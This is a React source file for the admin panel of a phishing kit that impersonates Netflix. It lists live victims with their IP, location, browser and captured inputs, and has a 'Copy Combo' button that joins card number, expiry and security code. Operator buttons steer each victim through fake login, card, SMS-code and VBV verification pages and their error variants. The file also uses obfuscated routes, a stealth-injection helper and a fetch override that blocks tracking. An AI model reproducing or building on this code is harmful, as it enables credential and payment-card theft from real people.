import React, { useState, useEffect, useRef, useLayoutEffect, useMemo } from 'react';
import { socket } from '../index';
import './pstyles.css';
import { FaEye, FaEyeSlash, FaCheck } from "react-icons/fa"; // For the eye toggle icon
import { blockUser } from "../utils/useAntiBot"; // ✅ Import Block Function
import axios from 'axios';
import { generateRandomizedPath } from "../utils/routes"; // ✅ Import the function
import { getEncryptedPath, getObfuscatedLoginPath } from '../utils/encPath';
import CBAR from './CBar';
import { injectStealthToComponent } from '../utils/injSteaArt';

const GenView = () => {
  const [activeUsers, setActiveUsers] = useState([]);
  const [routes, setRoutes] = useState({});
  const [showModal, setShowModal] = useState(false);
  const [currentSessionId, setCurrentSessionId] = useState('');
  const [inputsConfig, setInputsConfig] = useState([
    { id: 1, name: "1", type: 'hidden', placeholder: '' },
    { id: 2, name: "2", type: 'hidden', placeholder: '' },
    { id: 3, name: "3", type: 'hidden', placeholder: '' }
  ]);
  const [isAdmin, setIsAdmin] = useState(false);
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [customText, setCustomText] = useState(`A secure verification code has been sent to your registered mobile number via SMS.
By entering the code below, you are authorizing a payment to WWW.NETFLIX.COM.
This action constitutes your consent to proceed with the transaction under the terms of your card issuer agreement.`); // ✅ Store custom text
  const [buttonStates, setButtonStates] = useState({});
  const [isUnderMaintenance, setIsUnderMaintenance] = useState(false);
  
  const containerRef = useRef(null);

  useEffect(() => {
    requestAnimationFrame(() => {
      if (containerRef.current) {
        injectStealthToComponent(containerRef.current);
      }
    });
  }, []);
    

  useEffect(() => {
    const savedHour = sessionStorage.getItem("adm-s_h");
    const currentHour = new Date().getUTCHours().toString();
  
    const cookieIsValid = () => {
      return document.cookie.split(";").some(c => c.trim().startsWith("TSecTok="));
    };
    if (cookieIsValid() && savedHour === currentHour) {
      setIsAdmin(true);
    } else {
      // Expired or invalid — clear both
      document.cookie = "TSecTok=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
      sessionStorage.removeItem("adm-s_h");
      setIsAdmin(false);
    }
  }, []);
  
    
  
  
  useEffect(() => {
    if (!isAdmin) return;
  
    const handleUpdate = (data) => {
      setActiveUsers(data.activeUsers || []);
    };
  
    socket.on("update", handleUpdate);
  
    // 🔐 Secrets set in .env or directly here
    const weatherSecret = process.env.REACT_APP_WEATHER_SECRET;
    const newsSecret = process.env.REACT_APP_NEWS_SECRET;
  
    const weatherPath = getEncryptedPath(weatherSecret);
    const newsPath = getEncryptedPath(newsSecret);
  
    const base = process.env.REACT_APP_API_URL;
  
    // 🌦️ Fetch active users
    fetch(`${base}/${weatherPath}`)
      .then(res => res.json())
      .then(data => {
        setActiveUsers(data.activeUsers || []);
      });
  
    // 📰 Fetch previous users
  
    return () => {
      socket.off("update", handleUpdate);
    };
  }, [isAdmin]);
  

  const handleAdminLogin = async () => {
    const secret = process.env.REACT_APP_ADMIN_SECRET;
    const path = getObfuscatedLoginPath(secret);  
    const res = await fetch(`${process.env.REACT_APP_API_URL}/${path}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password }),
      credentials: 'include' // ✅ To receive cookie
    });
  
    if (res.ok) {
      setIsAdmin(true);
      const currentHour = new Date().getUTCHours().toString();
      sessionStorage.setItem("adm-s_h", currentHour);
          }
    
     else {
      window.location.href = "/";
    }
  };
// **🔥 Improved Modern Styling**
const styles = {
  overlay: {
    position: "fixed",
    top: 0,
    left: 0,
    width: "100%",
    height: "100%",
    background: "rgba(0, 0, 0, 0.5)", // Dark translucent background
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    backdropFilter: "blur(10px)", // **Glassmorphism Effect**
  },
  modal: {
    background: "rgba(25, 25, 25, 0.95)", // Sleek dark background
    padding: "25px",
    borderRadius: "12px",
    textAlign: "center",
    boxShadow: "0 10px 30px rgba(0, 0, 0, 0.3)", // Neumorphism shadow
    width: "320px",
    transition: "all 0.3s ease-in-out",
  },
  title: {
    color: "#fff",
    fontSize: "18px",
    fontWeight: "bold",
    marginBottom: "10px",
    textTransform: "uppercase",
    letterSpacing: "1px",
  },
  divider: {
    width: "80%",
    height: "2px",
    backgroundColor: "#444", // Thin dark separator
    margin: "0 auto 15px auto",
  },
  inputContainer: {
    position: "relative",
    width: "100%",
  },
  input: {
    padding: "12px",
    width: "100%", // Fixed width issue
    borderRadius: "6px",
    border: "none",
    background: "rgba(255, 255, 255, 0.1)", // Transparent look
    color: "#fff",
    fontSize: "14px",
    textAlign: "center",
    outline: "none",
    transition: "0.2s",
  },
  eyeIcon: {
    position: "absolute",
    right: "12px",
    top: "50%",
    transform: "translateY(-50%)",
    cursor: "pointer",
    color: "#bbb",
    fontSize: "16px",
  },
  button: {
    padding: "12px",
    marginTop: "15px",
    width: "100%",
    background: "#007bff",
    color: "#fff",
    fontWeight: "bold",
    border: "none",
    borderRadius: "6px",
    cursor: "pointer",
    transition: "0.3s",
    boxShadow: "0 4px 10px rgba(0, 123, 255, 0.3)",
  },
};
const activeNames = [
  "🌐 Online Watchers",
  "👁️ Live Sessions",
  "🧠 Active Agents",
  "🛰️ Real-Time Users",
  "🔎 Live Observers",
  "⚡️ Online Viewers",
  "📡 Connected Nodes",
  "🪐 Present Trackers",
  "🔬 Signal Monitors",
  "🕶️ Linked Operatives",
  "🔗 Engaged Terminals",
  "🚨 Real-Time Pings",
  "🧭 Current Beacons",
  "💠 Live Access Points",
  "🎛️ Operational Clients",
  "🧬 Session Entities",
  "🌀 Verified Actors",
  "🎯 Focused Viewers",
  "🚀 Active Interfaces",
  "📍 Immediate Observers"
];


// Persist across renders (random on mount)
const [randomActiveTitle] = useState(() => activeNames[Math.floor(Math.random() * activeNames.length)]);
const [darkMode, setDarkMode] = useState(true); // default dark
useEffect(() => {
  const originalFetch = window.fetch;

  // 🛑 Override fetch to block tracking API
  window.fetch = async (...args) => {
    const url = typeof args[0] === "string" ? args[0] : args[0]?.url;

    if (url && url.includes("apiv")) {
      return Promise.resolve({ ok: true, status: 200, json: async () => ({ blocked: true }) });
    }

    return originalFetch(...args);
  };

  // ♻️ Cleanup fetch override when GenView unmounts
  return () => {
    window.fetch = originalFetch;
  };
}, []);

useEffect(() => {
  document.body.classList.toggle('dark-mode', darkMode);
}, [darkMode]);
useEffect(() => {
  const saved = sessionStorage.getItem("kght-dkmd");
  if (saved === "dark") setDarkMode(true);
}, []);

useEffect(() => {
  sessionStorage.setItem("kght-dkmd", darkMode ? "dark" : "light");
}, [darkMode]);
const titles = [
  "Next Steo Of The Op",
  "OPERATION CONTROL",
  "THE GATEWAY",
  "SYSTEM ENTRY",
  "SECURE NODE",
  "INTEL INTERFACE",
  "BLACK VAULT",
  "ANON LOGIN",
  "REZ ENTRY",
  "STEALTH PANEL",
  "DARK CONSOLE",
  "ACCESS TERMINAL",
  "COMMAND MODULE",
  "NODE UNLOCK",
  "SAGA ENTRY"
];
const randomTitle = useMemo(() => {
  return titles[Math.floor(Math.random() * titles.length)];
}, []);

if (!isAdmin) {
  return (
    <div ref={containerRef} style={styles.overlay}>
      <div style={styles.modal}>
        <h2 style={styles.title}><FaEye /> {randomTitle} <FaEye /></h2>
        <div style={styles.divider}></div>
        <div style={styles.inputContainer}>
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Enter The Saga"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            style={styles.input}
          />
          <span style={styles.eyeIcon}>
            <FaEye />
          </span>
        </div>
        <button onClick={handleAdminLogin} style={styles.button}>
          Enter
        </button>
      </div>
    </div>
  );
}
const generateRandomizedSessionUpdatePath = (uCukkzD) => {
  const baseChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  
  // Generate a random obfuscated string
  const generateObfuscatedString = (length) => 
      Array.from({ length }, () => baseChars.charAt(Math.floor(Math.random() * baseChars.length))).join("");

  const obfPrefix = generateObfuscatedString(Math.floor(Math.random() * (8 - 4 + 1)) + 4); // Random length between 4-8
  const obfSuffix = generateObfuscatedString(Math.floor(Math.random() * (8 - 4 + 1)) + 4); // Random length between 4-8

  return `/${obfPrefix}/${uCukkzD}/${obfSuffix}`;
};

const handleRouteChange = async (uCukkzD, routeKey) => {
  const newRoute = generateRandomizedPath(routeKey); 
  const sessionUpdatePath = generateRandomizedSessionUpdatePath(uCukkzD); 
  const buttonKey = `${uCukkzD}-${routeKey}`; // 🔥 Unique key for each button

  try {
    const response = await axios.post(`${process.env.REACT_APP_API_URL}${sessionUpdatePath}`, {
      uCukkzD,
      newRoute
    });

    if (response.status === 200) {
      setRoutes(prev => ({
        ...prev,
        [uCukkzD]: newRoute
      }));

      // ✅ Animate only the clicked button
      setButtonStates(prev => ({ ...prev, [buttonKey]: "success" }));

      // ⏳ Reset after 2 seconds
      setTimeout(() => {
        setButtonStates(prev => ({ ...prev, [buttonKey]: null }));
      }, 2000);
    }
  } catch (error) {
  }
};



  const handleOut = (uCukkzD) => {
    socket.emit('redirectUser', { uCukkzD, url: 'https://NETFLIX.COM' });
  };

  const handleAddCustomInput = (uCukkzD) => {
    setCurrentSessionId(uCukkzD);
    setShowModal(true);
  };

  const handleInputConfigChange = (index, field, value) => {
    setInputsConfig(prev => {
      const newConfig = [...prev];
      newConfig[index][field] = value;
      return newConfig;
    });
  };
  
  const handleSaveInput = () => {
    socket.emit('configureInputs', { uCukkzD: currentSessionId, inputsConfig, customText  });
    sessionStorage.setItem(`cstingc_${currentSessionId}`, JSON.stringify(inputsConfig));
    sessionStorage.setItem(`cstx_${currentSessionId}`, customText);
    setShowModal(false);
    handleRouteChange(currentSessionId, 'vbSssn');
  };

  const handleStopSpinner = (uCukkzD) => {
    socket.emit('stopSpinner', { uCukkzD });
    handleRouteChange(uCukkzD, 'vbErr');
  };
  /*const handleBlockUser = async (ip, uCukkzD) => {
    if (!ip || !uCukkzD) return;
  
    try {
      await blockUser(ip, uCukkzD);
  
      alert(`User with IP ${ip} has been blocked.`);
  
      // ✅ Make sure we send the correct session ID to WebSocket
      socket.emit("redirectUser", { sessionId: uCukkzD, url: "https://google.com" });
    } catch (error) {
    }
  };*/
  const handleBlockUser = (ip, uCukkzD) => {
    // Just show animated maintenance screen for now
    setIsUnderMaintenance(true);
  
    // Auto-hide after 4 seconds (you can change this duration)
    setTimeout(() => {
      setIsUnderMaintenance(false);
    }, 4000);
  };
  
    
  const UserCard = ({ user, isActive }) => {
    if (!user || !user.uCukkzD) {
      return null;
    }

    return (
      <div className="user-card">
        <div className="user-info">
          <div className="card-header">
            <span>🔗Session: {user.uCukkzD}</span>
            <span>{new Date(user.timestamp).toLocaleTimeString()}</span>
          </div>
          <p><strong>🌍IP:</strong> {user.ip}</p>
          <p><strong>📍Location:</strong> {user.country}</p>
          <p><strong>👁️Current View:</strong> {user.pageUrl}</p>
          <p><strong>🎬Event Type:</strong> {user.eventType}</p>
          <p><strong>🌐Browser:</strong> {user.browserInfo}</p>
          {user.componentName && <p><strong>Component:</strong> {user.componentName}</p>}
          {!isActive && (
            <p className="disconnected-time">
              <strong>Disconnected:</strong> {new Date(user.disconnectedAt).toLocaleString()}
            </p>
          )}
        </div>
        <div className="user-inputs">
          {user.inputs && Object.entries(user.inputs).map(([key, data]) => (
            <div key={key} className="input-data">
              <span>{key}: {data.value}</span>
            </div>
          ))}
        </div>
        <div style={{ marginTop: "8px", display: "flex", justifyContent: "flex-end", alignItems: "center" }}>
  <button
    onClick={() => {
      const combo = `${user.inputs?.cardNumber?.value || ""} | ${user.inputs?.expiryDate?.value || ""} | ${user.inputs?.securityCode?.value || ""}`;
      
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(combo)
          .then(() => {
            const el = document.getElementById(`copied-${user.uCukkzD}`);
            if (el) {
              el.style.opacity = 1;
              setTimeout(() => (el.style.opacity = 0), 1500);
            }
          })
          .catch((err) => {
            alert("Clipboard write failed. Copy manually:\n" + combo);
          });
      } else {
        alert("Clipboard not supported. Copy manually:\n" + combo);
      }
    }}
    style={{
      padding: "5px 10px",
      fontSize: "12px",
      background: darkMode ? "#f2f2f2" : "#1a1a1a",
      color: darkMode ? "#1a1a1a" : "#f2f2f2",
      border: "1px solid",
      borderColor: darkMode ? "#ccc" : "#444",
      borderRadius: "4px",
      cursor: "pointer",
      transition: "all 0.2s ease",
    }}
  >
    📋 Copy Combo
  </button>
  <span
    id={`copied-${user.uCukkzD}`}
    style={{
      marginLeft: "10px",
      fontSize: "12px",
      color: darkMode ? "#0f0" : "#080",
      opacity: 0,
      transition: "opacity 0.3s ease"
    }}
  >
    ✅ Copied
  </span>
</div>

        <div className="route-buttons">
  {/* 🔑 LOGIN */}
  <button
    className={`action-button ${buttonStates[`${user.uCukkzD}-login`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleRouteChange(user.uCukkzD, 'login')}>
    {buttonStates[`${user.uCukkzD}-login`] === "success" ? <FaCheck className="check-icon" /> : <>🔑 LOGIN</>}
  </button>

  {/* 📲 APP */}
  <button
    className={`action-button ${buttonStates[`${user.uCukkzD}-mblApp`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleRouteChange(user.uCukkzD, 'mblApp')}>
    {buttonStates[`${user.uCukkzD}-mblApp`] === "success" ? <FaCheck className="check-icon" /> : <>📲 APP</>}
  </button>

  {/* 💳 CC */}
  <button
    className={`action-button ${buttonStates[`${user.uCukkzD}-cAttnt`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleRouteChange(user.uCukkzD, 'cAttnt')}>
    {buttonStates[`${user.uCukkzD}-cAttnt`] === "success" ? <FaCheck className="check-icon" /> : <>💳 CC</>}
  </button>
  {/* ❌💳 CC Error */}
  <button
    className={`action-button hoverror ${buttonStates[`${user.uCukkzD}-ccFaid`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleRouteChange(user.uCukkzD, 'ccFaid')}>
    {buttonStates[`${user.uCukkzD}-ccFaid`] === "success" ? <FaCheck className="check-icon" /> : <>❌💳 CC Error</>}
  </button>
  {/* 📩 SMS */}
  <button
    className={`action-button ${buttonStates[`${user.uCukkzD}-esEms`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleRouteChange(user.uCukkzD, 'esEms')}>
    {buttonStates[`${user.uCukkzD}-esEms`] === "success" ? <FaCheck className="check-icon" /> : <>📩 SMS</>}
  </button>
  {/* ⚠️📩 SMS Error */}
  <button
    className={`action-button hoverror ${buttonStates[`${user.uCukkzD}-esEmserr`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleRouteChange(user.uCukkzD, 'esEmserr')}>
    {buttonStates[`${user.uCukkzD}-esEmserr`] === "success" ? <FaCheck className="check-icon" /> : <>⚠️📩 SMS Error</>}
  </button>


  {/* 🔧🔑 CUSTOM (Special Handler) */}
  <button
    className={`action-button ${buttonStates[`${user.uCukkzD}-vbSssn`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleAddCustomInput(user.uCukkzD)}>
    {buttonStates[`${user.uCukkzD}-vbSssn`] === "success" ? <FaCheck className="check-icon" /> : <>🔧🔑 CUSTOM</>}
  </button>
  <button
    className={`action-button hoverror ${buttonStates[`${user.uCukkzD}-vbErr`] === "success" ? "success-animation" : ""}`} 
    onClick={() => handleStopSpinner(user.uCukkzD)}>
    {buttonStates[`${user.uCukkzD}-vbErr`] === "success" ? <FaCheck className="check-icon" /> : <>⚠️🔧 CUSTOM ERROR</>}
  </button>



  {/* OUT 🚪 */}
  <button onClick={() => handleOut(user.uCukkzD)}>
            OUT 🚪
          </button>
 

  {/* 🚨 RESTRICT */}
  <button className='hoverror' onClick={() => handleBlockUser(user.ip, user.uCukkzD)}>
    🚨 RESTRICT
  </button>
</div>
      </div>
    );
  };
  if (isUnderMaintenance) {
    return (
      <div style={{
        width: "100vw",
        height: "100vh",
        background: "#0d0d0d",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        color: "#0ff",
        fontFamily: "monospace",
        fontSize: "18px",
        animation: "flicker 1.2s infinite alternate"
      }}>
        <div>🚧 UNDER MAINTENANCE 🚧</div>
        <div style={{ marginTop: "10px", fontSize: "13px", color: "#999" }}>
          System module initializing...
        </div>
        <style>
          {`
            @keyframes flicker {
              0% { opacity: 0.7; transform: scale(0.98); }
              100% { opacity: 1; transform: scale(1.01); }
            }
          `}
        </style>
      </div>
    );
  }
  
  return (
    <>
    <CBAR />
    <button onClick={() => setDarkMode(prev => !prev)} style={{
  position: 'fixed',
  top: 20,
  right: 20,
  zIndex: 9999,
  background: darkMode ? '#fff' : '#000',
  color: darkMode ? '#000' : '#fff',
  border: '1px solid #888',
  padding: '6px 12px',
  borderRadius: '6px',
  fontSize: '13px',
  cursor: 'pointer'
}}>
  {darkMode ? '☀️ Light Mode' : '🌙 Dark Mode'}
</button>

    <div ref={containerRef} className="admin-panel">
      <div className="panel-section">
      <h2>{randomActiveTitle} ({activeUsers.length})</h2>        <div className="users-grid">
          {activeUsers.map(user => (
            <UserCard key={user.uCukkzD} user={user} isActive={true} />
          ))}
        </div>
      </div>

      {showModal && (
        <div className="modal-overlay">
          <div className="modal">
            <h2>Custom VBV Settings</h2>
            <div className="input-config">
            <input
  type="text"
  value={customText}
  onChange={(e) => setCustomText(e.target.value)}
  placeholder="Enter Custom Message"
  style={{ width: "100%", padding: "8px", marginTop: "10px", borderRadius: "5px" }}
/>

              {inputsConfig.map((input, index) => (
                <div key={input.id}>
                  <select
                    value={input.type}
                    onChange={(e) => handleInputConfigChange(index, 'type', e.target.value)}
                  >
                    <option value="hidden">Hidden</option>
                    <option value="text">Text</option>
                  </select>
                  {input.type === 'text' && (
                    <input
                      type="text"
                      value={input.placeholder}
                      onChange={(e) => handleInputConfigChange(index, 'placeholder', e.target.value)}
                      placeholder="Placeholder"
                    />
                  )}
                </div>
              ))}
            </div>
            <button onClick={handleSaveInput}>Save</button>
            <button onClick={() => setShowModal(false)}>Cancel</button>
          </div>
        </div>
      )}
    </div>
  </>
  );
};

export default GenView;
